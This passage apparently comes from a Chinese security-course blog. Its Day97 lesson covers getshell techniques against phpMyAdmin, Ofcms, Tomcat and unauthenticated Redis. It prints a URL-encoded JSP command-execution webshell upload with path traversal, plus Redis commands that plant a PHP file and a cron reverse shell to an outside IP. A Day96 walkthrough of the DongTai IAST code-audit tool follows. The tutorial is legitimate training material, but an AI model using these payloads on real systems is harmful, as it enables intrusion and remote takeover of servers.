title="接口权限："></a>接口权限：</h5><p>后台或网站权限后的获取途径：后台（修改配置信息功能点），网站权限（查看的配置文件获取），具体可以操作的事情大家自己想想。</p><p>系统权限：如同在你自己操作自己的电脑一样</p><p>域控权限：如同在你自己操作自己的虚拟机一样</p><blockquote><h3 id="演示案例："><a href="#演示案例：" class="headerlink" title="演示案例："></a>演示案例：</h3><h4 id="➢-中间件语言类-权限-ASP-amp-NET-amp-PHP-amp-JSP"><a href="#➢-中间件语言类-权限-ASP-amp-NET-amp-PHP-amp-JSP" class="headerlink" title="➢ 中间件语言类-权限-ASP&amp;NET&amp;PHP&amp;JSP"></a>➢ 中间件语言类-权限-ASP&amp;NET&amp;PHP&amp;JSP</h4><h4 id="➢-第三方应用类-Phpmyadmin后台Getshell操作"><a href="#➢-第三方应用类-Phpmyadmin后台Getshell操作" class="headerlink" title="➢ 第三方应用类-Phpmyadmin后台Getshell操作"></a>➢ 第三方应用类-Phpmyadmin后台Getshell操作</h4><h4 id="➢-网站CMS源码类-Ofcms系统后台Getshell操作"><a href="#➢-网站CMS源码类-Ofcms系统后台Getshell操作" class="headerlink" title="➢ 网站CMS源码类-Ofcms系统后台Getshell操作"></a>➢ 网站CMS源码类-Ofcms系统后台Getshell操作</h4><h4 id="➢-Web容器中间件类-Tomcat平台后台Getshell操作"><a href="#➢-Web容器中间件类-Tomcat平台后台Getshell操作" class="headerlink" title="➢ Web容器中间件类-Tomcat平台后台Getshell操作"></a>➢ Web容器中间件类-Tomcat平台后台Getshell操作</h4><h4 id="➢-数据库服务类-Redis未授权管理终端Getshell操作"><a href="#➢-数据库服务类-Redis未授权管理终端Getshell操作" class="headerlink" title="➢ 数据库服务类-Redis未授权管理终端Getshell操作"></a>➢ 数据库服务类-Redis未授权管理终端Getshell操作</h4></blockquote><p><img src="/../images/Day97-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Web%E6%9D%83%E9%99%90-%E6%9D%83%E9%99%90%E5%88%92%E5%88%86-%E6%BA%90%E7%A0%81%E5%90%8E%E5%8F%B0-%E4%B8%AD%E9%97%B4%E4%BB%B6-%E7%AC%AC%E4%B8%89%E6%96%B9-%E6%95%B0%E6%8D%AE%E5%BA%93%E7%AD%89/image-20230417141140734.png" alt="image-20230417141140734"></p><h4 id="中间件语言类-权限-ASP-amp-NET-amp-PHP-amp-JSP"><a href="#中间件语言类-权限-ASP-amp-NET-amp-PHP-amp-JSP" class="headerlink" title="#中间件语言类-权限-ASP&amp;NET&amp;PHP&amp;JSP"></a>#中间件语言类-权限-ASP&amp;NET&amp;PHP&amp;JSP</h4><h5 id="1、中间件语言："><a href="#1、中间件语言：" class="headerlink" title="1、中间件语言："></a>1、中间件语言：</h5><p>JSP：Tomcat</p><p>ASP&amp;NET：IIS</p><p>PHP：LAMP&amp;软件</p><h5 id="2、权限划分"><a href="#2、权限划分" class="headerlink" title="2、权限划分"></a>2、权限划分</h5><p><strong>Linux：</strong></p><p>管理员UID为0：系统的管理员用户。</p><p>系统用户UID为1～999：Linux系统为了避免因某个服务程序出现漏洞而被黑客提权至整台服务器，默认服务程序会由独立的系统用户负责运行，进而有效控制被破坏范围。</p><p>普通用户UID从1000开始：是由管理员创建的用于日常工作的用户。</p><p><strong>Windows</strong>：</p><p>用户及组：system administrator user guest等</p><p><strong>jsp搭建的网站webshell都是root权限，如果网站的权限是管理员一步步按照LAMP这样一个个配置安装的，那么拿到的webshell的权限就是普通用户的，但是如果管理员用的是phpstudy这种集成软件搭建的网站，上传了webshell拿到的权限就是root权限</strong></p><p><img src="/../images/Day97-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Web%E6%9D%83%E9%99%90-%E6%9D%83%E9%99%90%E5%88%92%E5%88%86-%E6%BA%90%E7%A0%81%E5%90%8E%E5%8F%B0-%E4%B8%AD%E9%97%B4%E4%BB%B6-%E7%AC%AC%E4%B8%89%E6%96%B9-%E6%95%B0%E6%8D%AE%E5%BA%93%E7%AD%89/image-20230417142555127.png" alt="image-20230417142555127"></p><h4 id="第三方应用类-Phpmyadmin后台Getshell操作"><a href="#第三方应用类-Phpmyadmin后台Getshell操作" class="headerlink" title="#第三方应用类-Phpmyadmin后台Getshell操作"></a>#第三方应用类-Phpmyadmin后台Getshell操作</h4><p><img src="/../images/Day97-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Web%E6%9D%83%E9%99%90-%E6%9D%83%E9%99%90%E5%88%92%E5%88%86-%E6%BA%90%E7%A0%81%E5%90%8E%E5%8F%B0-%E4%B8%AD%E9%97%B4%E4%BB%B6-%E7%AC%AC%E4%B8%89%E6%96%B9-%E6%95%B0%E6%8D%AE%E5%BA%93%E7%AD%89/image-20230417114507916.png" alt="image-20230417114507916"></p><p><a href="https://www.cnblogs.com/fzblog/p/13912387.html">https://www.cnblogs.com/fzblog/p/13912387.html</a></p><p>低版本：直接导出后门 高版本：secure防护利用日志记录保存后门</p><h6 id="数据库权限到web权限跨越"><a href="#数据库权限到web权限跨越" class="headerlink" title="数据库权限到web权限跨越"></a>数据库权限到web权限跨越</h6><h6 id="登陆后可以用sql语句写入后门"><a href="#登陆后可以用sql语句写入后门" class="headerlink" title="登陆后可以用sql语句写入后门"></a>登陆后可以用sql语句写入后门</h6><p><img src="/../images/Day97-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Web%E6%9D%83%E9%99%90-%E6%9D%83%E9%99%90%E5%88%92%E5%88%86-%E6%BA%90%E7%A0%81%E5%90%8E%E5%8F%B0-%E4%B8%AD%E9%97%B4%E4%BB%B6-%E7%AC%AC%E4%B8%89%E6%96%B9-%E6%95%B0%E6%8D%AE%E5%BA%93%E7%AD%89/image-20230417113851993.png" alt="image-20230417113851993"></p><h6 id="连接上车的后面，可以获取整个系统的盘符"><a href="#连接上车的后面，可以获取整个系统的盘符" class="headerlink" title="连接上车的后面，可以获取整个系统的盘符"></a>连接上车的后面，可以获取整个系统的盘符</h6><p><img src="/../images/Day97-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Web%E6%9D%83%E9%99%90-%E6%9D%83%E9%99%90%E5%88%92%E5%88%86-%E6%BA%90%E7%A0%81%E5%90%8E%E5%8F%B0-%E4%B8%AD%E9%97%B4%E4%BB%B6-%E7%AC%AC%E4%B8%89%E6%96%B9-%E6%95%B0%E6%8D%AE%E5%BA%93%E7%AD%89/image-20230417114133305.png" alt="image-20230417114133305"></p><h6 id="也可以由web权限到数据库权限，上传webshell获取到远程数据库的密码后连接"><a href="#也可以由web权限到数据库权限，上传webshell获取到远程数据库的密码后连接" class="headerlink" title="也可以由web权限到数据库权限，上传webshell获取到远程数据库的密码后连接"></a>也可以由web权限到数据库权限，上传webshell获取到远程数据库的密码后连接</h6><h4 id="网站CMS源码类-Ofcms系统后台Getshell操作"><a href="#网站CMS源码类-Ofcms系统后台Getshell操作" class="headerlink" title="#网站CMS源码类-Ofcms系统后台Getshell操作"></a>#网站CMS源码类-Ofcms系统后台Getshell操作</h4><p><a href="https://blog.csdn.net/oufua/article/details/82584637">(26条消息) ofcms v1.1版本 idea 部署步骤及相关问题 开源java cms_ofcms数据库失败_oufu的博客-CSDN博客</a></p><p><img src="/../images/Day97-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Web%E6%9D%83%E9%99%90-%E6%9D%83%E9%99%90%E5%88%92%E5%88%86-%E6%BA%90%E7%A0%81%E5%90%8E%E5%8F%B0-%E4%B8%AD%E9%97%B4%E4%BB%B6-%E7%AC%AC%E4%B8%89%E6%96%B9-%E6%95%B0%E6%8D%AE%E5%BA%93%E7%AD%89/image-20230417140204035.png" alt="image-20230417140204035"></p><p><img src="/../images/Day97-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Web%E6%9D%83%E9%99%90-%E6%9D%83%E9%99%90%E5%88%92%E5%88%86-%E6%BA%90%E7%A0%81%E5%90%8E%E5%8F%B0-%E4%B8%AD%E9%97%B4%E4%BB%B6-%E7%AC%AC%E4%B8%89%E6%96%B9-%E6%95%B0%E6%8D%AE%E5%BA%93%E7%AD%89/image-20230417114742771.png" alt="image-20230417114742771"></p><p><strong>利用后台已有功能点进行获取：SQL执行，文件上传，模版修改，外部引用等</strong></p><p><strong>1.明确功能点实现的意义是否满足网站权限的提升</strong></p><p><strong>2.不同的程序可以通过程序名版本进行网上公开资料利用</strong></p><p>file_path&#x3D;&amp;dirs&#x3D;%2F&amp;res_path&#x3D;res&amp;file_name&#x3D;..&#x2F;..&#x2F;static&#x2F;jsp_shell.jsp&amp;file_content&#x3D;%3C%25%0A++++if(%22p0desta%22.equals(request.getParameter(%22pwd%22)))%7B%0A++++++++java.io.InputStream+in+%3D+Runtime.getRuntime().exec(request.getParameter(%22i%22)).getInputStream()%3B%0A++++++++int+a+%3D+-1%3B%0A++++++++byte%5B%5D+b+%3D+new+byte%5B2048%5D%3B%0A++++++++out.print(%22%3Cpre%3E%22)%3B%0A++++++++while((a%3Din.read(b))!%3D-1)%7B%0A++++++++++++out.println(new+String(b))%3B%0A++++++++%7D%0A++++++++out.print(%22%3C%2Fpre%3E%22)%3B%0A++++%7D%0A%25%3E</p><h6 id="模板修改处"><a href="#模板修改处" class="headerlink" title="模板修改处"></a>模板修改处</h6><p><img src="/../images/Day97-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Web%E6%9D%83%E9%99%90-%E6%9D%83%E9%99%90%E5%88%92%E5%88%86-%E6%BA%90%E7%A0%81%E5%90%8E%E5%8F%B0-%E4%B8%AD%E9%97%B4%E4%BB%B6-%E7%AC%AC%E4%B8%89%E6%96%B9-%E6%95%B0%E6%8D%AE%E5%BA%93%E7%AD%89/image-20230417115215513.png" alt="image-20230417115215513"></p><h6 id="利用修改模板内容上传木马，但是发现时html后缀，而且页面中修改不了，所以采用抓包修改，并修改上传内容为木马"><a href="#利用修改模板内容上传木马，但是发现时html后缀，而且页面中修改不了，所以采用抓包修改，并修改上传内容为木马" class="headerlink" title="利用修改模板内容上传木马，但是发现时html后缀，而且页面中修改不了，所以采用抓包修改，并修改上传内容为木马"></a>利用修改模板内容上传木马，但是发现时html后缀，而且页面中修改不了，所以采用抓包修改，并修改上传内容为木马</h6><p><img src="/../images/Day97-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Web%E6%9D%83%E9%99%90-%E6%9D%83%E9%99%90%E5%88%92%E5%88%86-%E6%BA%90%E7%A0%81%E5%90%8E%E5%8F%B0-%E4%B8%AD%E9%97%B4%E4%BB%B6-%E7%AC%AC%E4%B8%89%E6%96%B9-%E6%95%B0%E6%8D%AE%E5%BA%93%E7%AD%89/image-20230417115440128.png" alt="image-20230417115440128"></p><h6 id="filename目录要跳跃两级，因为当前执行目录不在static"><a href="#filename目录要跳跃两级，因为当前执行目录不在static" class="headerlink" title="filename目录要跳跃两级，因为当前执行目录不在static"></a>filename目录要跳跃两级，因为当前执行目录不在static</h6><p><img src="/../images/Day97-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Web%E6%9D%83%E9%99%90-%E6%9D%83%E9%99%90%E5%88%92%E5%88%86-%E6%BA%90%E7%A0%81%E5%90%8E%E5%8F%B0-%E4%B8%AD%E9%97%B4%E4%BB%B6-%E7%AC%AC%E4%B8%89%E6%96%B9-%E6%95%B0%E6%8D%AE%E5%BA%93%E7%AD%89/image-20230417115728664.png" alt="image-20230417115728664"></p><h6 id="也可以web权限通过查找数据库中管理员账号密码登录后台"><a href="#也可以web权限通过查找数据库中管理员账号密码登录后台" class="headerlink" title="也可以web权限通过查找数据库中管理员账号密码登录后台"></a>也可以web权限通过查找数据库中管理员账号密码登录后台</h6><p><img src="/../images/Day97-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Web%E6%9D%83%E9%99%90-%E6%9D%83%E9%99%90%E5%88%92%E5%88%86-%E6%BA%90%E7%A0%81%E5%90%8E%E5%8F%B0-%E4%B8%AD%E9%97%B4%E4%BB%B6-%E7%AC%AC%E4%B8%89%E6%96%B9-%E6%95%B0%E6%8D%AE%E5%BA%93%E7%AD%89/image-20230417135849877.png" alt="image-20230417135849877"></p><h4 id="Web容器中间件类-Tomcat平台后台Getshell操作"><a href="#Web容器中间件类-Tomcat平台后台Getshell操作" class="headerlink" title="#Web容器中间件类-Tomcat平台后台Getshell操作"></a>#Web容器中间件类-Tomcat平台后台Getshell操作</h4><p><img src="/../images/Day97-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Web%E6%9D%83%E9%99%90-%E6%9D%83%E9%99%90%E5%88%92%E5%88%86-%E6%BA%90%E7%A0%81%E5%90%8E%E5%8F%B0-%E4%B8%AD%E9%97%B4%E4%BB%B6-%E7%AC%AC%E4%B8%89%E6%96%B9-%E6%95%B0%E6%8D%AE%E5%BA%93%E7%AD%89/image-20230417140743609.png" alt="image-20230417140743609"></p><p>上传WAR包自动解析部署-JSP压缩ZIP后修改WAR后缀</p><h4 id="数据库服务类-Redis未授权管理终端Getshell操作"><a href="#数据库服务类-Redis未授权管理终端Getshell操作" class="headerlink" title="#数据库服务类-Redis未授权管理终端Getshell操作"></a>#数据库服务类-Redis未授权管理终端Getshell操作</h4><p><img src="/../images/Day97-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Web%E6%9D%83%E9%99%90-%E6%9D%83%E9%99%90%E5%88%92%E5%88%86-%E6%BA%90%E7%A0%81%E5%90%8E%E5%8F%B0-%E4%B8%AD%E9%97%B4%E4%BB%B6-%E7%AC%AC%E4%B8%89%E6%96%B9-%E6%95%B0%E6%8D%AE%E5%BA%93%E7%AD%89/image-20230417140758210.png" alt="image-20230417140758210"></p><p>启动环境：&#x2F;opt&#x2F;redis-2.8.17# <code>redis-server /etc/redis.conf</code></p><h5 id="1-Webshell写入："><a href="#1-Webshell写入：" class="headerlink" title="1.Webshell写入："></a>1.Webshell写入：</h5><p><code>config set dir /home/wwwroot/default  #设置WEB写入目录</code></p><p><code>config set dbfilename test.php #设置写入文件名</code></p><p><code>set test &quot;&lt;?php phpinfo();?&gt;&quot;  #设置写入文件代码</code></p><p><code>bgsave                         #保存执行</code></p><p><code>save                           #保存执行</code></p><h5 id="2-计划任务反弹shell"><a href="#2-计划任务反弹shell" class="headerlink" title="2.计划任务反弹shell"></a>2.计划任务反弹shell</h5><p><code>config set dir /var/spool/cron/crontabs #设置写入计划任务目录</code></p><p><code>config set dbfilename root #设置写入文件名</code></p><p><code>set xx &quot;\n\n\n* * * * * bash -i &gt;&amp; /dev/tcp/47.75.212.155/3333 0&gt;&amp;1\n\n\n&quot;  #设置写入文件代码</code></p><p><code>save         #保存执行</code></p><h5 id="3-Redis-RCE反弹shell"><a href="#3-Redis-RCE反弹shell" class="headerlink" title="3.Redis RCE反弹shell"></a>3.Redis RCE反弹shell</h5><p><a href="https://github.com/n0b0dyCN/redis-rogue-server">https://github.com/n0b0dyCN/redis-rogue-server</a></p><p><code>python redis-rogue-server.py --rhost=47.94.236.117 --lhost=47.75.212.155 --exp=exp.so</code></p>]]></content>
      
      
      <categories>
          
          <category> 权限提升 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Day96 代码审计-SAST&amp;IAST项目&amp;火线洞态&amp;Agent部署&amp;插件安装&amp;产品测评</title>
      <link href="/2023/04/11/Day96-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SAST-IAST%E9%A1%B9%E7%9B%AE-%E7%81%AB%E7%BA%BF%E6%B4%9E%E6%80%81-Agent%E9%83%A8%E7%BD%B2-%E6%8F%92%E4%BB%B6%E5%AE%89%E8%A3%85-%E4%BA%A7%E5%93%81%E6%B5%8B%E8%AF%84/"/>
      <url>/2023/04/11/Day96-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SAST-IAST%E9%A1%B9%E7%9B%AE-%E7%81%AB%E7%BA%BF%E6%B4%9E%E6%80%81-Agent%E9%83%A8%E7%BD%B2-%E6%8F%92%E4%BB%B6%E5%AE%89%E8%A3%85-%E4%BA%A7%E5%93%81%E6%B5%8B%E8%AF%84/</url>
      
        <content type="html"><![CDATA[<h3 id="知识点："><a href="#知识点：" class="headerlink" title="#知识点："></a>#知识点：</h3><p>1、代码审计-开源版&amp;商业版</p><p>2、代码审计-单语言&amp;多语言</p><p>3、代码审计-DAST&amp;SAST&amp;IAST</p><h3 id="Java审计知识点："><a href="#Java审计知识点：" class="headerlink" title="#Java审计知识点："></a>#Java审计知识点：</h3><p><a href="https://xz.aliyun.com/t/7945">https://xz.aliyun.com/t/7945</a> java代码审计常规思路和方法.pdf</p><p>SQL注入，XSS跨站，RCE执行，反序列化，身份验证，SPEL，SSTI，三方组件安全等</p><h3 id="章节点："><a href="#章节点：" class="headerlink" title="#章节点："></a>#章节点：</h3><p>1、语言审计-PHP&amp;.Net&amp;Java&amp;Python</p><p>2、漏洞审计-注入&amp;上传&amp;RCE&amp;未授权等</p><p>3、框架审计-ThinkPHP&amp;Spring&amp;Flask等</p><p>4、工具审计-RIPS&amp;VCG&amp;Fortify&amp;Bandit等</p><p>5、技术审计-动静态调试&amp;DAST&amp;SAST&amp;IAST等</p><p><img src="/../images/Day96-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SAST-IAST%E9%A1%B9%E7%9B%AE-%E7%81%AB%E7%BA%BF%E6%B4%9E%E6%80%81-Agent%E9%83%A8%E7%BD%B2-%E6%8F%92%E4%BB%B6%E5%AE%89%E8%A3%85-%E4%BA%A7%E5%93%81%E6%B5%8B%E8%AF%84/Qu9rvdL1uVm46pnMkdIKKw.png" alt="img"></p><p><img src="/../images/Day96-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SAST-IAST%E9%A1%B9%E7%9B%AE-%E7%81%AB%E7%BA%BF%E6%B4%9E%E6%80%81-Agent%E9%83%A8%E7%BD%B2-%E6%8F%92%E4%BB%B6%E5%AE%89%E8%A3%85-%E4%BA%A7%E5%93%81%E6%B5%8B%E8%AF%84/1KVCYs7pMFhVOkRfle1BnA.png" alt="img"></p><blockquote><h3 id="演示案例："><a href="#演示案例：" class="headerlink" title="演示案例："></a>演示案例：</h3><h4 id="➢-代码审计利器-IAST-插件"><a href="#➢-代码审计利器-IAST-插件" class="headerlink" title="➢ 代码审计利器-IAST-插件"></a>➢ 代码审计利器-IAST-插件</h4><h4 id="➢-代码审计利器-IAST-Agent"><a href="#➢-代码审计利器-IAST-Agent" class="headerlink" title="➢ 代码审计利器-IAST-Agent"></a>➢ 代码审计利器-IAST-Agent</h4></blockquote><h4 id="代码审计利器-IAST-火线洞态测评报告"><a href="#代码审计利器-IAST-火线洞态测评报告" class="headerlink" title="#代码审计利器-IAST-火线洞态测评报告"></a>#代码审计利器-IAST-火线洞态测评报告</h4><p>文档：<a href="https://doc.dongtai.io/docs/introduction">https://doc.dongtai.io/docs/introduction</a></p><p>安装：<a href="https://github.com/HXSecurity/DongTai">https://github.com/HXSecurity/DongTai</a></p><p>控制台：<a href="https://iast.huoxian.cn/project/projectManage">https://iast.huoxian.cn/project/projectManage</a></p><p>测试台：<a href="https://labs.iast.huoxian.cn/#/images/index">https://labs.iast.huoxian.cn/#/images/index</a></p><p>主要测评：应用漏洞&amp;组件安全</p><p>在线靶场测评：openrasp&amp;spring</p><p>本地应用测评：IDEA_Plugin插件</p><p>Agent部署测评：DongTai OpenApi</p><h5 id="1、IDEA-Plugin插件"><a href="#1、IDEA-Plugin插件" class="headerlink" title="1、IDEA_Plugin插件"></a>1、IDEA_Plugin插件</h5><p><a href="https://github.com/HXSecurity/DongTai-Plugin-IDEA/releases">https://github.com/HXSecurity/DongTai-Plugin-IDEA/releases</a></p><p><a href="https://doc.dongtai.io/docs/getting-started/agent/plugin/java-agent-idea">https://doc.dongtai.io/docs/getting-started/agent/plugin/java-agent-idea</a></p><h6 id="下载之后"><a href="#下载之后" class="headerlink" title="下载之后"></a>下载之后</h6><p><img src="/../images/Day96-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SAST-IAST%E9%A1%B9%E7%9B%AE-%E7%81%AB%E7%BA%BF%E6%B4%9E%E6%80%81-Agent%E9%83%A8%E7%BD%B2-%E6%8F%92%E4%BB%B6%E5%AE%89%E8%A3%85-%E4%BA%A7%E5%93%81%E6%B5%8B%E8%AF%84/image-20230414152901729.png" alt="image-20230414152901729"></p><h6 id="配置云端"><a href="#配置云端" class="headerlink" title="配置云端"></a>配置云端</h6><p><img src="/../images/Day96-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SAST-IAST%E9%A1%B9%E7%9B%AE-%E7%81%AB%E7%BA%BF%E6%B4%9E%E6%80%81-Agent%E9%83%A8%E7%BD%B2-%E6%8F%92%E4%BB%B6%E5%AE%89%E8%A3%85-%E4%BA%A7%E5%93%81%E6%B5%8B%E8%AF%84/image-20230414153220551.png" alt="image-20230414153220551"></p><h6 id="改这两个地方"><a href="#改这两个地方" class="headerlink" title="改这两个地方"></a>改这两个地方</h6><p><img src="/../images/Day96-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SAST-IAST%E9%A1%B9%E7%9B%AE-%E7%81%AB%E7%BA%BF%E6%B4%9E%E6%80%81-Agent%E9%83%A8%E7%BD%B2-%E6%8F%92%E4%BB%B6%E5%AE%89%E8%A3%85-%E4%BA%A7%E5%93%81%E6%B5%8B%E8%AF%84/image-20230414154132505.png" alt="image-20230414154132505"></p><h6 id="点击启动"><a href="#点击启动" class="headerlink" title="点击启动"></a>点击启动</h6><p><img src="/../images/Day96-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SAST-IAST%E9%A1%B9%E7%9B%AE-%E7%81%AB%E7%BA%BF%E6%B4%9E%E6%80%81-Agent%E9%83%A8%E7%BD%B2-%E6%8F%92%E4%BB%B6%E5%AE%89%E8%A3%85-%E4%BA%A7%E5%93%81%E6%B5%8B%E8%AF%84/image-20230414154245064.png" alt="image-20230414154245064"></p><h6 id="如果成功会提示"><a href="#如果成功会提示" class="headerlink" title="如果成功会提示"></a>如果成功会提示</h6><p><img src="/../images/Day96-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SAST-IAST%E9%A1%B9%E7%9B%AE-%E7%81%AB%E7%BA%BF%E6%B4%9E%E6%80%81-Agent%E9%83%A8%E7%BD%B2-%E6%8F%92%E4%BB%B6%E5%AE%89%E8%A3%85-%E4%BA%A7%E5%93%81%E6%B5%8B%E8%AF%84/image-20230414154307945.png" alt="image-20230414154307945"></p><h6 id="启动之后可以看到洞态里面自动新建了相应的项目"><a href="#启动之后可以看到洞态里面自动新建了相应的项目" class="headerlink" title="启动之后可以看到洞态里面自动新建了相应的项目"></a>启动之后可以看到洞态里面自动新建了相应的项目</h6><p><img src="/../images/Day96-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SAST-IAST%E9%A1%B9%E7%9B%AE-%E7%81%AB%E7%BA%BF%E6%B4%9E%E6%80%81-Agent%E9%83%A8%E7%BD%B2-%E6%8F%92%E4%BB%B6%E5%AE%89%E8%A3%85-%E4%BA%A7%E5%93%81%E6%B5%8B%E8%AF%84/image-20230414154611069.png" alt="image-20230414154611069"></p><h6 id="本地在网站里面随意地方点加载数据包"><a href="#本地在网站里面随意地方点加载数据包" class="headerlink" title="本地在网站里面随意地方点加载数据包"></a>本地在网站里面随意地方点加载数据包</h6><p><img src="/../images/Day96-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SAST-IAST%E9%A1%B9%E7%9B%AE-%E7%81%AB%E7%BA%BF%E6%B4%9E%E6%80%81-Agent%E9%83%A8%E7%BD%B2-%E6%8F%92%E4%BB%B6%E5%AE%89%E8%A3%85-%E4%BA%A7%E5%93%81%E6%B5%8B%E8%AF%84/image-20230414154848951.png" alt="image-20230414154848951"></p><p><img src="/../images/Day96-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SAST-IAST%E9%A1%B9%E7%9B%AE-%E7%81%AB%E7%BA%BF%E6%B4%9E%E6%80%81-Agent%E9%83%A8%E7%BD%B2-%E6%8F%92%E4%BB%B6%E5%AE%89%E8%A3%85-%E4%BA%A7%E5%93%81%E6%B5%8B%E8%AF%84/image-20230414155045764.png" alt="image-20230414155045764"></p><h6 id="这里开启以后就不用自己去主动访问网站，它会自动全局扫描"><a href="#这里开启以后就不用自己去主动访问网站，它会自动全局扫描" class="headerlink" title="这里开启以后就不用自己去主动访问网站，它会自动全局扫描"></a>这里开启以后就不用自己去主动访问网站，它会自动全局扫描</h6><p><img src="/../images/Day96-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SAST-IAST%E9%A1%B9%E7%9B%AE-%E7%81%AB%E7%BA%BF%E6%B4%9E%E6%80%81-Agent%E9%83%A8%E7%BD%B2-%E6%8F%92%E4%BB%B6%E5%AE%89%E8%A3%85-%E4%BA%A7%E5%93%81%E6%B5%8B%E8%AF%84/image-20230414155247690.png" alt="image-20230414155247690"></p><h5 id="2、Agent部署"><a href="#2、Agent部署" class="headerlink" title="2、Agent部署"></a>2、Agent部署</h5><p><a href="https://doc.dongtai.io/docs/category/agent-%E5%AE%89%E8%A3%85%E6%8C%87%E5%8D%97">https://doc.dongtai.io/docs/category/agent-%E5%AE%89%E8%A3%85%E6%8C%87%E5%8D%97</a></p><h6 id="刚才的项目是Springboot搭建的，可以直接打开，但是这里另一个项目是tomcat搭建的，点击这个按钮会报错"><a href="#刚才的项目是Springboot搭建的，可以直接打开，但是这里另一个项目是tomcat搭建的，点击这个按钮会报错" class="headerlink" title="刚才的项目是Springboot搭建的，可以直接打开，但是这里另一个项目是tomcat搭建的，点击这个按钮会报错"></a>刚才的项目是Springboot搭建的，可以直接打开，但是这里另一个项目是tomcat搭建的，点击这个按钮会报错</h6><p><img src="/../images/Day96-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SAST-IAST%E9%A1%B9%E7%9B%AE-%E7%81%AB%E7%BA%BF%E6%B4%9E%E6%80%81-Agent%E9%83%A8%E7%BD%B2-%E6%8F%92%E4%BB%B6%E5%AE%89%E8%A3%85-%E4%BA%A7%E5%93%81%E6%B5%8B%E8%AF%84/image-20230414161002086.png" alt="image-20230414161002086"></p><h6 id="所以要部署Agent"><a href="#所以要部署Agent" class="headerlink" title="所以要部署Agent"></a>所以要部署Agent</h6><p><img src="/../images/Day96-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SAST-IAST%E9%A1%B9%E7%9B%AE-%E7%81%AB%E7%BA%BF%E6%B4%9E%E6%80%81-Agent%E9%83%A8%E7%BD%B2-%E6%8F%92%E4%BB%B6%E5%AE%89%E8%A3%85-%E4%BA%A7%E5%93%81%E6%B5%8B%E8%AF%84/image-20230414160257783.png" alt="image-20230414160257783"></p><h6 id="下载了jar包以后，先运行网站获得网站运行对应的PID号，这里点那个绿色的按钮启动，但是遇到了错误，怀疑是本地Mysql版本冲突了，之前搭建时用的是老的phpstudy上集成的MYSQL服务，现在是小皮面板的MYSQL-所以关闭新版，启动之前的老版本"><a href="#下载了jar包以后，先运行网站获得网站运行对应的PID号，这里点那个绿色的按钮启动，但是遇到了错误，怀疑是本地Mysql版本冲突了，之前搭建时用的是老的phpstudy上集成的MYSQL服务，现在是小皮面板的MYSQL-所以关闭新版，启动之前的老版本" class="headerlink" title="下载了jar包以后，先运行网站获得网站运行对应的PID号，这里点那个绿色的按钮启动，但是遇到了错误，怀疑是本地Mysql版本冲突了，之前搭建时用的是老的phpstudy上集成的MYSQL服务，现在是小皮面板的MYSQL,所以关闭新版，启动之前的老版本"></a>下载了jar包以后，先运行网站获得网站运行对应的PID号，这里点那个绿色的按钮启动，但是遇到了错误，怀疑是本地Mysql版本冲突了，之前搭建时用的是老的phpstudy上集成的MYSQL服务，现在是小皮面板的MYSQL,所以关闭新版，启动之前的老版本</h6><p><img src="/../images/Day96-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SAST-IAST%E9%A1%B9%E7%9B%AE-%E7%81%AB%E7%BA%BF%E6%B4%9E%E6%80%81-Agent%E9%83%A8%E7%BD%B2-%E6%8F%92%E4%BB%B6%E5%AE%89%E8%A3%85-%E4%BA%A7%E5%93%81%E6%B5%8B%E8%AF%84/image-20230414161512571.png" alt="image-20230414161512571"></p><h6 id="再次启动运行成功"><a href="#再次启动运行成功" class="headerlink" title="再次启动运行成功"></a>再次启动运行成功</h6><p><img src="/../images/Day96-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SAST-IAST%E9%A1%B9%E7%9B%AE-%E7%81%AB%E7%BA%BF%E6%B4%9E%E6%80%81-Agent%E9%83%A8%E7%BD%B2-%E6%8F%92%E4%BB%B6%E5%AE%89%E8%A3%85-%E4%BA%A7%E5%93%81%E6%B5%8B%E8%AF%84/image-20230414161755845.png" alt="image-20230414161755845"></p><h6 id="因为需要获取对应端口的PID号，这里是8088，输入命令查看"><a href="#因为需要获取对应端口的PID号，这里是8088，输入命令查看" class="headerlink" title="因为需要获取对应端口的PID号，这里是8088，输入命令查看"></a>因为需要获取对应端口的PID号，这里是8088，输入命令查看</h6><p><img src="/../images/Day96-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SAST-IAST%E9%A1%B9%E7%9B%AE-%E7%81%AB%E7%BA%BF%E6%B4%9E%E6%80%81-Agent%E9%83%A8%E7%BD%B2-%E6%8F%92%E4%BB%B6%E5%AE%89%E8%A3%85-%E4%BA%A7%E5%93%81%E6%B5%8B%E8%AF%84/image-20230414162058118.png" alt="image-20230414162058118"></p><h6 id="提示成功，等待即可"><a href="#提示成功，等待即可" class="headerlink" 